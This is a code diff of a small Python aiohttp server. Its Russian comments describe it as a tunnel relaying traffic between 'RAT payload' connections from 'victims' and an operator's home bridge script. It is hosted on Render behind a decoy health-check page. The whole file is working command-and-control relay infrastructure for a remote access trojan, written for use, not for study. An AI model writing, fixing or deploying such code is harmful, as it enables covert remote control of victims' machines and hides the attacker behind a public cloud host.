@@ -1,72 +1,67 @@
 import os
-from aiohttp import web, WSMsgType
-import asyncio
+from aiohttp import web
 
-# Хранилище активных соединений
+# Хранилище соединений
 village_ws = None
-web_conns = {}
+remote_clients = {}
 
 async def handle_control(request):
-    """Управляющее соединение (для твоего bridge.py)"""
-    global village_client
+    """Канал для твоего домашнего моста (bridge.py)"""
+    global village_ws
     ws = web.WebSocketResponse()
     await ws.prepare(request)
-    
-    village_client = ws
+    village_ws = ws
     print("[+] Мост из деревни подключен")
-    
     try:
         async for msg in ws:
-            if msg.type == WSMsgType.BINARY:
+            if msg.type == web.WSMsgType.BINARY:
+                # Пересылаем данные от тебя к жертве
                 data = msg.data
                 if data.startswith(b"DATA:"):
-                    parts = data.split(b":", 2)
-                    conn_id = parts[1].decode()
-                    if conn_id in web_conns:
-                        await web_conns[conn_id].send_bytes(parts[2])
+                    _, conn_id, payload = data.split(b":", 2)
+                    cid = conn_id.decode()
+                    if cid in remote_clients:
+                        await remote_clients[cid].send_bytes(payload)
     finally:
-        village_client = None
+        village_ws = None
         print("[-] Мост отключен")
     return ws
 
-async def handle_public(request):
-    """Входящие соединения (для твоей ратки)"""
-    global village_client
-    if not village_client:
+async def handle_traffic(request):
+    """Канал для входящих подключений (RAT payload)"""
+    if village_ws is None:
         return web.Response(status=503, text="Tunnel Offline")
-
+    
     ws = web.WebSocketResponse()
     await ws.prepare(request)
     
     import uuid
     conn_id = str(uuid.uuid4())[:8]
-    web_conns[conn_id] = ws
+    remote_clients[conn_id] = ws
+    print(f"[*] Новая цель подключена: {conn_id}")
     
-    print(f"[*] Новое соединение [{conn_id}]")
-    await village_client.send_str(f"OPEN:{conn_id}")
-
+    await village_ws.send_str(f"OPEN:{conn_id}")
+    
     try:
         async for msg in ws:
-            if msg.type in (WSMsgType.BINARY, WSMsgType.TEXT):
-                payload = msg.data if isinstance(msg.data, bytes) else msg.data.encode()
-                packet = f"DATA:{conn_id}:".encode() + payload
-                await village_client.send_bytes(packet)
+            payload = msg.data if msg.type == web.WSMsgType.BINARY else msg.data.encode()
+            header = f"DATA:{conn_id}:".encode()
+            await village_ws.send_bytes(header + payload)
     finally:
-        if village_client:
-            await village_client.send_str(f"CLOSE:{conn_id}")
-        web_conns.pop(conn_id, None)
+        if village_ws:
+            await village_ws.send_str(f"CLOSE:{conn_id}")
+        remote_clients.pop(conn_id, None)
     return ws
 
 async def health_check(request):
-    return web.Response(text="Nexus Tunnel is Live")
+    """Заглушка для Render, чтобы он не ругался"""
+    return web.Response(text="Nexus Server is Running")
 
 app = web.Application()
-app.add_routes([
-    web.get('/control', handle_control), # Сюда вешаем bridge.py
-    web.get('/', health_check),          # Это для Render (Health Check)
-    web.get('/{tail:.*}', handle_public) # Всё остальное — трафик для ратки
-])
+app.router.add_get('/control', handle_control)
+app.router.add_get('/', health_check)
+app.router.add_get('/{tail:.*}', handle_traffic)
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
-    web.run_app(app, host='0.0.0.0', port=port)
+    web.run_app(app, port=port)
